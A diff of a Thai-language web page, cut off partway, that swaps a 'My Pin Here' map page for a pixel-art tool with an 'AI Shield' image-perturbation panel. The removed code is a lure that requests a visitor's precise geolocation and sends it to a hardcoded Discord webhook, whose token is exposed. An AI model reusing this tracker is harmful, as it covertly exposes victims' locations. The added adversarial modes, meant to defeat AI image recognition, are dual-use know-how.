@@ -2,470 +2,1070 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Pin Here</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pixel Frame RGB + AI Shield</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden;
-            background: #f0f2f5;
+            background:#050508; color:#e0e0e0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            min-height:100vh; overflow-x:hidden; touch-action:none;
+        }
+        .app-header {
+            background:linear-gradient(135deg,#0a0a1a,#12122a); padding:16px; text-align:center;
+            border-bottom:1px solid #1a1a3a; position:sticky; top:0; z-index:100; backdrop-filter:blur(10px);
+        }
+        .app-header h1 {
+            font-size:1.4rem; font-weight:800;
+            background:linear-gradient(90deg,#ff1a1a,#1aff1a,#1a1aff); -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+            letter-spacing:-0.5px;
+        }
+        .app-header p { color:#666; font-size:0.72rem; margin-top:4px; }
+
+        .controls-panel {
+            background:#0a0a14; padding:12px 16px; border-bottom:1px solid #1a1a2e;
+            display:flex; flex-wrap:wrap; gap:10px; align-items:end; justify-content:center;
+            overflow-x:auto; -webkit-overflow-scrolling:touch;
+        }
+        .control-group { display:flex; flex-direction:column; gap:3px; align-items:center; min-width:60px; }
+        .control-group label { font-size:0.65rem; text-transform:uppercase; letter-spacing:0.5px; color:#555; font-weight:600; white-space:nowrap; }
+        .control-group input[type="number"] {
+            background:#12121e; border:1px solid #2a2a3e; color:#fff; padding:6px 8px; border-radius:6px;
+            font-size:0.85rem; width:70px; text-align:center; outline:none;
+        }
+        .control-group input[type="number"]:focus { border-color:#ff4080; }
+        .control-group input[type="range"] {
+            width:100px; height:4px; -webkit-appearance:none; appearance:none; background:#1a1a2e; border-radius:2px; outline:none;
+        }
+        .control-group input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance:none; width:14px; height:14px; background:linear-gradient(135deg,#ff4080,#ff8040);
+            border-radius:50%; cursor:pointer; box-shadow:0 2px 6px rgba(255,64,128,0.4);
+        }
+        .control-group input[type="file"] { display:none; }
+
+        .btn {
+            background:linear-gradient(135deg,#1a1a3e,#12122a); border:1px solid #2a2a4e; color:#aaa;
+            padding:8px 14px; border-radius:8px; cursor:pointer; font-size:0.8rem; transition:all 0.2s;
+            display:inline-flex; align-items:center; gap:5px; font-weight:500; white-space:nowrap;
+        }
+        .btn:hover { background:linear-gradient(135deg,#2a2a5e,#1a1a4a); border-color:#4a4a7e; color:#fff; transform:translateY(-1px); box-shadow:0 4px 12px rgba(0,0,0,0.3); }
+        .btn:active { transform:translateY(0); }
+        .btn.primary { background:linear-gradient(135deg,#e02050,#ff4080); border-color:#ff4080; color:#fff; }
+        .btn.primary:hover { background:linear-gradient(135deg,#f03060,#ff6090); box-shadow:0 4px 16px rgba(255,64,128,0.4); }
+        .btn.success { background:linear-gradient(135deg,#00a040,#00d060); border-color:#00d060; color:#fff; }
+        .btn.success:hover { background:linear-gradient(135deg,#00c050,#00e070); box-shadow:0 4px 16px rgba(0,208,96,0.4); }
+        .btn.info { background:linear-gradient(135deg,#2040c0,#4080ff); border-color:#4080ff; color:#fff; }
+        .btn.info:hover { background:linear-gradient(135deg,#3050d0,#5090ff); }
+        .btn.warning { background:linear-gradient(135deg,#c08000,#ffaa00); border-color:#ffaa00; color:#000; }
+        .btn.warning:hover { background:linear-gradient(135deg,#d09010,#ffbb20); }
+        .btn.ghost { background:transparent; border-color:#3a3a5e; color:#888; }
+        .btn.ghost:hover { border-color:#666; color:#fff; }
+        .btn.active-mode { background:linear-gradient(135deg,#ff4080,#ff8040); border-color:#ff8040; color:#fff; box-shadow:0 0 12px rgba(255,64,128,0.3); }
+        .btn.danger { background:linear-gradient(135deg,#801010,#c02020); border-color:#c02020; color:#fff; }
+        .btn.danger:hover { background:linear-gradient(135deg,#a02020,#e03030); }
+
+        .mode-panel {
+            background:#0d0d18; padding:10px 16px; border-bottom:1px solid #1a1a2e;
+            display:flex; gap:8px; overflow-x:auto; -webkit-overflow-scrolling:touch;
+        }
+        .mode-desc {
+            background:#0d0d18; padding:8px 16px; border-bottom:1px solid #1a1a2e;
+            font-size:0.75rem; color:#666; text-align:center; min-height:32px;
         }
 
-        /* Permission Page */
-        #permission-page {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            transition: opacity 0.6s ease, transform 0.6s ease;
+        .canvas-area {
+            display:flex; justify-content:center; align-items:center; padding:20px;
+            min-height:300px; background:#020205; position:relative; overflow:hidden;
+        }
+        #mainCanvas {
+            border:1px solid #1a1a3e; border-radius:4px;
+            box-shadow:0 0 60px rgba(0,0,0,0.8), 0 0 0 1px #1a1a3e;
+            cursor:grab; image-rendering:pixelated; image-rendering:crisp-edges;
+            max-width:100%; touch-action:none; background:#000;
+        }
+        #mainCanvas:active { cursor:grabbing; }
+        .hint-badge {
+            position:absolute; top:10px; right:10px; background:rgba(255,255,255,0.03);
+            border:1px solid rgba(255,255,255,0.05); padding:6px 12px; border-radius:8px;
+            font-size:0.7rem; color:#444; pointer-events:none;
+        }
+        .info-bar {
+            position:absolute; bottom:10px; left:50%; transform:translateX(-50%);
+            background:rgba(10,10,20,0.9); border:1px solid #2a2a4e; padding:6px 14px;
+            border-radius:20px; font-size:0.7rem; color:#666; pointer-events:none; backdrop-filter:blur(4px); white-space:nowrap;
         }
 
-        #permission-page.hidden {
-            opacity: 0;
-            transform: scale(1.05);
-            pointer-events: none;
+        .modal-overlay {
+            display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.85); z-index:1000; justify-content:center; align-items:center;
+            padding:20px; backdrop-filter:blur(8px);
+        }
+        .modal-overlay.active { display:flex; }
+        .modal-box {
+            background:#12121e; border:1px solid #2a2a4e; border-radius:12px; width:100%; max-width:900px;
+            max-height:90vh; overflow:hidden; display:flex; flex-direction:column; box-shadow:0 20px 60px rgba(0,0,0,0.5);
+        }
+        .modal-header { display:flex; justify-content:space-between; align-items:center; padding:16px 20px; border-bottom:1px solid #1a1a2e; }
+        .modal-header h3 { color:#fff; font-size:1rem; }
+        .modal-close { background:none; border:none; color:#555; font-size:1.5rem; cursor:pointer; width:32px; height:32px; display:flex; align-items:center; justify-content:center; border-radius:6px; transition:all 0.2s; }
+        .modal-close:hover { background:#1a1a2e; color:#fff; }
+        .modal-body { padding:20px; overflow:auto; flex:1; }
+        .copy-tabs { display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; }
+        .copy-tab { background:#1a1a2e; border:1px solid #2a2a4e; color:#888; padding:8px 16px; border-radius:6px; cursor:pointer; font-size:0.8rem; transition:all 0.2s; }
+        .copy-tab.active { background:linear-gradient(135deg,#ff4080,#ff8040); border-color:#ff4080; color:#fff; }
+        .copy-tab:hover:not(.active) { border-color:#4a4a7e; color:#ccc; }
+        .preview-area {
+            background:#0a0a14; border:1px solid #1a1a2e; border-radius:8px; padding:16px;
+            overflow:auto; max-height:50vh; font-family:'Courier New',monospace; font-size:6px; line-height:6px; white-space:pre; color:#fff;
+        }
+        .preview-area.ansi { font-size:8px; line-height:8px; }
+
+        .checkbox-wrapper { display:flex; align-items:center; gap:6px; cursor:pointer; font-size:0.8rem; color:#888; }
+        .checkbox-wrapper input { width:16px; height:16px; accent-color:#ff4080; }
+        .value-badge { background:#1a1a2e; color:#ff4080; font-weight:700; font-size:0.75rem; padding:2px 8px; border-radius:4px; min-width:36px; text-align:center; }
+        .row-flex { display:flex; align-items:center; gap:8px; }
+
+        .toast {
+            position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(100px);
+            background:#1a1a3e; border:1px solid #4a4a7e; color:#fff; padding:12px 24px;
+            border-radius:8px; font-size:0.85rem; z-index:3000; opacity:0; transition:all 0.3s ease;
+            pointer-events:none; box-shadow:0 8px 32px rgba(0,0,0,0.4);
+        }
+        .toast.show { transform:translateX(-50%) translateY(0); opacity:1; }
+
+        .loading-overlay {
+            display:none; position:fixed; top:0; left:0; width:100%; height:100%;
+            background:rgba(0,0,0,0.9); z-index:2000; justify-content:center; align-items:center; flex-direction:column; gap:16px;
+        }
+        .loading-overlay.active { display:flex; }
+        .spinner { width:48px; height:48px; border:3px solid #1a1a3e; border-top-color:#ff4080; border-radius:50%; animation:spin 1s linear infinite; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+
+        /* Warning Modal */
+        .warning-box {
+            background:#1a0a0a; border:2px solid #c02020; border-radius:12px; width:100%; max-width:500px;
+            padding:24px; box-shadow:0 0 40px rgba(192,32,32,0.3);
+        }
+        .warning-box h2 {
+            color:#ff4444; font-size:1.3rem; margin-bottom:12px; text-align:center;
+            display:flex; align-items:center; justify-content:center; gap:8px;
+        }
+        .warning-box .warning-content {
+            color:#ccc; font-size:0.85rem; line-height:1.6; margin-bottom:20px;
+        }
+        .warning-box .warning-content ul {
+            margin-left:20px; margin-top:8px; color:#888;
+        }
+        .warning-box .warning-content li {
+            margin-bottom:6px;
+        }
+        .warning-box .warning-content strong {
+            color:#ff6666;
+        }
+        .warning-actions {
+            display:flex; gap:12px; justify-content:center;
         }
 
-        .permission-card {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 3rem 2.5rem;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 420px;
-            width: 90%;
-            animation: slideUp 0.8s ease;
+        /* AI Shield specific */
+        .shield-panel {
+            background:#0a0a14; padding:12px 16px; border-bottom:1px solid #1a1a2e;
+            display:none; flex-wrap:wrap; gap:10px; align-items:end; justify-content:center;
         }
+        .shield-panel.active { display:flex; }
 
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px); }
-            to { opacity: 1; transform: translateY(0); }
+        .compare-toggle {
+            position:absolute; top:10px; left:10px;
+            background:rgba(10,10,20,0.9); border:1px solid #2a2a4e;
+            padding:6px 12px; border-radius:6px; font-size:0.75rem; color:#888;
+            cursor:pointer; z-index:10; backdrop-filter:blur(4px);
         }
+        .compare-toggle:hover { border-color:#ff4080; color:#fff; }
+        .compare-toggle.active { background:rgba(255,64,128,0.2); border-color:#ff4080; color:#ff4080; }
 
-        .location-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 1.5rem;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
-            50% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(255, 107, 107, 0); }
-        }
-
-        .location-icon svg {
-            width: 40px;
-            height: 40px;
-            fill: white;
-        }
-
-        .permission-card h1 {
-            color: #2d3436;
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-        }
-
-        .permission-card .subtitle {
-            color: #636e72;
-            font-size: 1rem;
-            margin-bottom: 1.5rem;
-        }
-
-        .permission-info {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 1.2rem;
-            margin-bottom: 1.5rem;
-            text-align: left;
-            border-left: 4px solid #667eea;
-        }
-
-        .permission-info p {
-            color: #2d3436;
-            font-size: 0.95rem;
-            line-height: 1.6;
-        }
-
-        .permission-info .coords {
-            font-family: 'Courier New', monospace;
-            background: #e9ecef;
-            padding: 0.3rem 0.6rem;
-            border-radius: 6px;
-            font-size: 0.85rem;
-            color: #495057;
-            display: inline-block;
-            margin-top: 0.5rem;
-        }
-
-        .btn-allow {
-            background: linear-gradient(135deg, #00b894, #00a085);
-            color: white;
-            border: none;
-            padding: 1rem 2.5rem;
-            font-size: 1.1rem;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 184, 148, 0.4);
-            font-weight: 600;
-            width: 100%;
-        }
-
-        .btn-allow:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 184, 148, 0.6);
-        }
-
-        .btn-allow:active {
-            transform: translateY(0);
-        }
-
-        .btn-allow:disabled {
-            background: #b2bec3;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .error-msg {
-            color: #e74c3c;
-            font-size: 0.9rem;
-            margin-top: 1rem;
-            display: none;
-        }
-
-        .loading {
-            display: none;
-            margin-top: 1rem;
-        }
-
-        .loading-spinner {
-            width: 24px;
-            height: 24px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Map Page */
-        #map-page {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            transition: opacity 0.6s ease;
-            z-index: 1;
-        }
-
-        #map-page.visible {
-            opacity: 1;
-            z-index: 100;
-        }
-
-        #map {
-            width: 100%;
-            height: 100%;
-        }
-
-        .map-header {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(255, 255, 255, 0.95);
-            padding: 0.8rem 1.5rem;
-            border-radius: 50px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-            animation: slideDown 0.6s ease;
-        }
-
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
-
-        .map-header .pin-dot {
-            width: 12px;
-            height: 12px;
-            background: #ff6b6b;
-            border-radius: 50%;
-            animation: blink 1.5s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-
-        .map-header h2 {
-            font-size: 1rem;
-            color: #2d3436;
-            font-weight: 600;
-        }
-
-        .map-header .coords-small {
-            font-size: 0.75rem;
-            color: #636e72;
-            font-family: monospace;
-        }
-
-        .custom-popup {
-            font-family: 'Segoe UI', sans-serif;
-        }
-
-        .custom-popup h3 {
-            margin: 0 0 0.5rem 0;
-            color: #2d3436;
-            font-size: 1.1rem;
-        }
-
-        .custom-popup p {
-            margin: 0;
-            color: #636e72;
-            font-size: 0.9rem;
-        }
-
-        .custom-popup .coord-box {
-            background: #f8f9fa;
-            padding: 0.4rem 0.6rem;
-            border-radius: 6px;
-            margin-top: 0.5rem;
-            font-family: monospace;
-            font-size: 0.8rem;
-            color: #495057;
+        @media (max-width:768px) {
+            .controls-panel { flex-direction:row; flex-wrap:nowrap; overflow-x:auto; justify-content:flex-start; padding:10px; }
+            .mode-panel { flex-wrap:nowrap; }
+            .shield-panel { flex-direction:row; flex-wrap:nowrap; overflow-x:auto; justify-content:flex-start; }
+            .app-header h1 { font-size:1.2rem; }
         }
     </style>
 </head>
 <body>
-    <div id="permission-page">
-        <div class="permission-card">
-            <div class="location-icon">
-                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+    <div class="app-header">
+        <h1>🔴🟢🔵 Pixel Frame RGB</h1>
+        <p>ลากเลื่อน • ซูม • คัดลอก | ระบบ Subpixel + AI Shield</p>
+    </div>
+
+    <!-- Main Controls -->
+    <div class="controls-panel" id="mainControls">
+        <div class="control-group">
+            <label>ภาพ</label>
+            <button class="btn" onclick="document.getElementById('fileInput').click()">📁 เปิด</button>
+            <input type="file" id="fileInput" accept="image/*">
+        </div>
+        <div class="control-group">
+            <label>Frame W</label>
+            <input type="number" id="frameWidth" value="64" min="8" max="256">
+        </div>
+        <div class="control-group">
+            <label>Frame H</label>
+            <input type="number" id="frameHeight" value="64" min="8" max="256">
+        </div>
+        <div class="control-group">
+            <label>Auto</label>
+            <div class="checkbox-wrapper" onclick="document.getElementById('autoSize').click()">
+                <input type="checkbox" id="autoSize">
             </div>
-            <h1>My Pin Here</h1>
-            <p class="subtitle">ตำแหน่งพิเศษรอคุณอยู่</p>
-
-            <div class="permission-info">
-                <p>
-                    <strong>ต้องการเข้าถึงตำแหน่งของคุณ</strong><br>
-                    เพื่อเข้าชมตำแหน่งนี้ คุณจำเป็นต้องอนุญาตให้เข้าถึงตำแหน่งที่ตั้งของอุปกรณ์ก่อน ระบบจะนำคุณไปยังหมุดบนแผนที่ทันทีที่ได้รับอนุญาต
-                </p>
-                <div class="coords">??.035218, ???.776758</div>
-            </div>
-
-            <button class="btn-allow" id="btnAllow" onclick="requestLocation()">
-                อนุญาตและเข้าชมตำแหน่ง
-            </button>
-
-            <div class="loading" id="loading">
-                <div class="loading-spinner"></div>
-            </div>
-
-            <p class="error-msg" id="errorMsg"></p>
+        </div>
+        <div class="control-group">
+            <label>Scale</label>
+            <div class="row-flex"><input type="range" id="pixelScale" value="12" min="6" max="24"><span class="value-badge" id="pixelScaleVal">12</span></div>
+        </div>
+        <div class="control-group">
+            <label>Gap</label>
+            <div class="row-flex"><input type="range" id="gap" value="1" min="0" max="3"><span class="value-badge" id="gapVal">1</span></div>
+        </div>
+        <div class="control-group">
+            <label>Zoom</label>
+            <div class="row-flex"><input type="range" id="zoomSlider" value="1" min="0.1" max="5" step="0.1"><span class="value-badge" id="zoomVal">1.0</span></div>
+        </div>
+        <div class="control-group">
+            <label>Light</label>
+            <div class="row-flex"><input type="range" id="brightness" value="100" min="50" max="200"><span class="value-badge" id="brightnessVal">100</span></div>
+        </div>
+        <div class="control-group">
+            <label>จัดการ</label>
+            <div class="row-flex"><button class="btn" id="resetBtn">↺</button><button class="btn info" id="fitBtn">⊘</button></div>
+        </div>
+        <div class="control-group">
+            <label>คัดลอก</label>
+            <div class="row-flex"><button class="btn primary" id="copyImageBtn">🖼️</button><button class="btn success" id="copyTextBtn">📋</button></div>
         </div>
     </div>
 
-    <div id="map-page">
-        <div class="map-header">
-            <div class="pin-dot"></div>
-            <div>
-                <h2>My Pin Here</h2>
-                <div class="coords-small">39.035218, 125.776758</div>
-            </div>
-        </div>
-        <div id="map"></div>
+    <!-- Mode Panel -->
+    <div class="mode-panel" id="modePanel">
+        <button class="btn active-mode" data-mode="normal" onclick="setMode('normal')">🎨 Normal</button>
+        <button class="btn ghost" data-mode="phase" onclick="setMode('phase')">🌊 Phase</button>
+        <button class="btn ghost" data-mode="shuffle" onclick="setMode('shuffle')">🔀 Shuffle</button>
+        <button class="btn ghost" data-mode="adversarial" onclick="setMode('adversarial')">👁️ Adversarial</button>
+        <button class="btn ghost" data-mode="edgebreak" onclick="setMode('edgebreak')">⚡ Edge</button>
+        <button class="btn ghost" data-mode="deepmask" onclick="setMode('deepmask')">🎭 Mask</button>
+        <button class="btn ghost" data-mode="scatter" onclick="setMode('scatter')">💫 Scatter</button>
+        <button class="btn ghost" data-mode="noisegrid" onclick="setMode('noisegrid')">🧩 Grid</button>
+        <button class="btn danger" data-mode="shield" onclick="enterShieldMode()">🛡️ AI Shield</button>
     </div>
 
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script>
-        // 🛠️ ใส่ URL Discord Webhook ของคุณตรงนี้แทนที่ข้อความเดิม
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw';
+    <div class="mode-desc" id="modeDesc">โหมดปกติ: แสดงภาพ RGB Subpixel แบบจอมือถือ มองไกลๆ จะเห็นภาพชัด</div>
 
-        const TARGET_LAT = 39.035218;
-        const TARGET_LNG = 125.776758;
+    <!-- AI Shield Panel (hidden by default) -->
+    <div class="shield-panel" id="shieldPanel">
+        <div class="control-group">
+            <label>เทคนิค</label>
+            <select id="shieldTechnique" style="background:#12121e;border:1px solid #2a2a3e;color:#fff;padding:6px 8px;border-radius:6px;font-size:0.8rem;outline:none;" onchange="updateShieldDesc()">
+                <option value="gradient">Gradient Masking</option>
+                <option value="dct">DCT Perturbation</option>
+                <option value="patch">Patch Randomize</option>
+                <option value="chromatic">Chromatic Shift</option>
+                <option value="freq">Frequency Split</option>
+                <option value="hash">Hash Poison</option>
+                <option value="mosaic">Smart Mosaic</option>
+                <option value="glitch">Glitch Burst</option>
+            </select>
+        </div>
+        <div class="control-group">
+            <label>Strength</label>
+            <div class="row-flex"><input type="range" id="shieldStrength" value="50" min="10" max="100"><span class="value-badge" id="shieldStrengthVal">50</span></div>
+        </div>
+        <div class="control-group">
+            <label>Block</label>
+            <input type="number" id="shieldBlock" value="8" min="2" max="32" style="width:60px">
+        </div>
+        <div class="control-group">
+            <label>Seed</label>
+            <input type="number" id="shieldSeed" value="42" min="0" max="9999" style="width:60px">
+        </div>
+        <div class="control-group">
+            <label>จัดการ</label>
+            <div class="row-flex">
+                <button class="btn warning" onclick="applyShield()">▶ ใช้</button>
+                <button class="btn" onclick="resetShield()">↺</button>
+            </div>
+        </div>
+        <div class="control-group">
+            <label>ผลลัพธ์</label>
+            <div class="row-flex">
+                <button class="btn primary" onclick="copyShieldImage()">🖼️</button>
+                <button class="btn success" onclick="downloadShield()">💾</button>
+            </div>
+        </div>
+    </div>
 
-        function requestLocation() {
-            const btn = document.getElementById('btnAllow');
-            const loading = document.getElementById('loading');
-            const errorMsg = document.getElementById('errorMsg');
+    <div class="shield-panel" id="shieldDescPanel" style="display:none;padding-top:0;">
+        <div style="color:#666;font-size:0.75rem;text-align:center;width:100%;">
+            <strong id="shieldTechName">Gradient Masking</strong>: <span id="shieldTechDesc">ใส่ noise ตาม gradient ของภาพ ทำลาย feature detection ของ AI แต่ตามนุษย์ยังเห็นภาพ</span>
+        </div>
+    </div>
 
-            btn.disabled = true;
-            loading.style.display = 'block';
-            errorMsg.style.display = 'none';
+    <!-- Canvas Area -->
+    <div class="canvas-area" id="canvasArea">
+        <div class="compare-toggle" id="compareToggle" onclick="toggleCompare()" style="display:none">👁 ดูต้นฉบับ</div>
+        <canvas id="mainCanvas"></canvas>
+        <div class="hint-badge" id="hintBadge">🖱️ ลากเลื่อน • หมุนซูม</div>
+        <div class="info-bar" id="infoBar">64×64 | 1.0x</div>
+    </div>
 
-            if (!navigator.geolocation) {
-                showError('เบราว์เซอร์ของคุณไม่รองรับการเข้าถึงตำแหน่ง');
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // ดึงค่าข้อมูลตำแหน่งของผู้ใช้งานจริง
-                    const userLat = position.coords.latitude;
-                    const userLng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const timestamp = new Date(position.timestamp).toLocaleString('th-TH');
-
-                    // ส่งข้อมูลไปยัง Discord Webhook ทันทีที่มีการกดยอมรับสิทธิ์
-                    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/1524030114285752450/ZBtCcXuvNSNIbfdY2vhQwJvFXfRgnhIzFhvtNzUVv0bMm-RVc5-9kmvkjX3kW7ap9Lqw') {
-                        fetch(DISCORD_WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                embeds: [{
-                                    title: "📍 ได้รับพิกัดตำแหน่งใหม่จากผู้ใช้งาน",
-                                    color: 16738123, // รหัสสีส้มแดง #ff6b6b
-                                    fields: [
-                                        { name: "ละติจูด (Latitude)", value: `\`${userLat}\``, inline: true },
-                                        { name: "ลองจิจูด (Longitude)", value: `\`${userLng}\``, inline: true },
-                                        { name: "ความแม่นยำรัศมี", value: `± ${accuracy.toFixed(2)} เมตร`, inline: true },
-                                        { name: "วันเวลาที่กดยอมรับ", value: timestamp, inline: false },
-                                        { name: "ลิงก์นำทางระบบ Google Maps", value: `https://www.google.com/maps?q=${userLat},${userLng}`, inline: false }
-                                    ],
-                                    footer: {
-                                        text: "ระบบติดตามพิกัดอัตโนมัติ • My Pin Here"
-                                    },
-                                    timestamp: new Date().toISOString()
-                                }]
-                            })
-                        }).catch(err => console.error('Discord Webhook transmission failed:', err));
-                    }
-
-                    // ปิดโหลดสถานะเดิมและเปลี่ยนการแสดงผลไปยังหน้าแผนที่
-                    loading.style.display = 'none';
-                    showMap();
-                },
-                (error) => {
-                    loading.style.display = 'none';
-                    btn.disabled = false;
-
-                    let message = 'ไม่สามารถเข้าถึงตำแหน่งได้';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            message = 'คุณปฏิเสธการเข้าถึงตำแหน่ง กรุณาอนุญาตเพื่อเข้าชม';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            message = 'ไม่สามารถระบุตำแหน่งได้ในขณะนี้';
-                            break;
-                        case error.TIMEOUT:
-                            message = 'หมดเวลาการขอตำแหน่ง กรุณาลองอีกครั้ง';
-                            break;
-                    }
-                    showError(message);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-
-        function showError(msg) {
-            const errorMsg = document.getElementById('errorMsg');
-            errorMsg.textContent = msg;
-            errorMsg.style.display = 'block';
-        }
-
-        function showMap() {
-            const permPage = document.getElementById('permission-page');
-            const mapPage = document.getElementById('map-page');
-
-            permPage.classList.add('hidden');
-
-            setTimeout(() => {
-                mapPage.classList.add('visible');
-                initMap();
-            }, 300);
-        }
-
-        let map;
-        function initMap() {
-            if (map) return;
-
-            map = L.map('map').setView([TARGET_LAT, TARGET_LNG], 15);
-
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap contributors',
-                maxZoom: 19
-            }).addTo(map);
-
-            const customIcon = L.divIcon({
-                className: 'custom-pin',
-                html: `<div style="
-                    width: 40px;
-                    height: 40px;
-                    background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-                    border-radius: 50% 50% 50% 0;
-                    transform: rotate(-45deg);
-                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    border: 3px solid white;
-                ">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white" style="transform: rotate(45deg);">
-                        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-                    </svg>
-                </div>`,
-                iconSize: [40, 40],
-                iconAnchor: [20, 40]
-            });
-
-            const marker = L.marker([TARGET_LAT, TARGET_LNG], { icon: customIcon }).addTo(map);
-
-            const popupContent = `
-                <div class="custom-popup">
-                    <h3>📍 My Pin Here</h3>
-                    <p>ตำแหน่งที่คุณต้องการเข้าชม</p>
-                    <div class="coord-box">${TARGET_LAT}, ${TARGET_LNG}</div>
+    <!-- Copy Modal -->
+    <div class="modal-overlay" id="copyModal">
+        <div class="modal-box">
+            <div class="modal-header"><h3>📋 คัดลอก Pixel Art</h3><button class="modal-close" onclick="closeModal()">&times;</button></div>
+            <div class="modal-body">
+                <div class="copy-tabs">
+                    <button class="copy-tab active" onclick="switchTab('ansi')">ANSI Color</button>
+                    <button class="copy-tab" onclick="switchTab('html')">HTML Grid</button>
+                    <button class="copy-tab" onclick="switchTab('subpixel')">Subpixel Text</button>
                 </div>
-            `;
+                <div style="margin-bottom:12px"><button class="btn primary" onclick="copyCurrentTab()">📋 คัดลอก</button></div>
+                <div class="preview-area" id="previewArea"></div>
+            </div>
+        </div>
+    </div>
 
-            marker.bindPopup(popupContent).openPopup();
+    <!-- Warning Modal -->
+    <div class="modal-overlay" id="warningModal" style="z-index:5000">
+        <div class="warning-box">
+            <h2>⚠️ คำเตือนก่อนใช้งาน</h2>
+            <div class="warning-content">
+                <p>ฟีเจอร์ <strong>AI Shield</strong> เป็นเครื่องมือป้องกันความเป็นส่วนตัว (Privacy Protection) สำหรับรูปภาพส่วนตัวของคุณ</p>
+                <ul>
+                    <li>เทคนิคเหล่านี้ใช้ <strong>Adversarial Perturbation</strong> เพื่อทำให้ AI ตรวจจับ/จำแนกภาพผิดพลาด</li>
+                    <li>ไม่รับประกัน 100% กับทุกระบบ AI เนื่องจาก model แต่ละตัวต่างกัน</li>
+                    <li>รูปภาพยังคงมองเห็นได้ด้วยตามนุษย์ แต่ AI จะมีความยากในการ analyze</li>
+                    <li>ใช้ความรับผิดชอบต่อสังคม ไม่ใช้เพื่อหลีกเลี่ยงกฎหมายหรือ platform policy ที่ชอบธรรม</li>
+                    <li>ประมวลผลทั้งหมดทำในเบราว์เซอร์ (client-side) ไม่มีการอัปโหลดขึ้นเซิร์ฟเวอร์</li>
+                </ul>
